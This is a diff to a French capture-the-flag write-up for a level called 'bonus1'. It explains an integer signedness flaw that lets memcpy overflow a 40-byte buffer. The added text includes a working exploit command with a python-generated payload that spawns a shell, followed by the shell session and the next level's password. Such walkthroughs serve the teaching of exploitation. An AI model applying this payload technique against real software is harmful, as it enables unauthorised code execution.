@@ -87,14 +87,13 @@ On remarque tout de suite ce qui est exploitable, avec `memcpy()` (+79) et surto
 
 On voit aussi que `atoi()` (+20) traduit le 1er argument et passe ensuite une condition `<= 9` (0x9 en +29), ce même argument sera ensuite multiplie par 4 et conserve dans $ecx pour definir la taille size_t de `memcpy()`, cependant après le `memcpy()`, il devra être égal à `0x574f4c46` soit [1464814662](https://fr.calcuworld.com/calculs-mathematiques/calculatrice-hexadecimal/). Le 2eme argument quand a lui est copier dans un buffer de 40 bytes (%esp), mais `memcpy()` ne pourra copier que `4 * 9 = 36 bytes` au max. Cependant on peux lui envoyer un nombre négatif pour dépasser la limite.
 
--366203665
+Pour le 1er argument, on va utiliser la valeur "-2147483608" qui correspond INTMIN(2147483648) + buffer(40). (On est pas oblige d'atteindre l'INTMIN, mais on prend large pour etre sur d'exploiter l'overflow de `memcpy()`)
+Pour le 2e argument, on va d'abord remplir le buffer, puis la valeur de `0x574f4c46` pour passer la condition et atteindre la fonction `execl("/bin/sh", "sh, 0)`
 
--2147483647 + 44 = -2147483603
-
--1781279982
-
--107374189
-
--1073741823
--1073741803
-
+```
+:~$ ./bonus1 -2147483608 `python -c 'print "\x90" * 40 + "\x46\x4c\x4f\x57"'`
+$ whoami
+bonus2
+$ cat /home/user/bonus2/.pass
+579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
+```
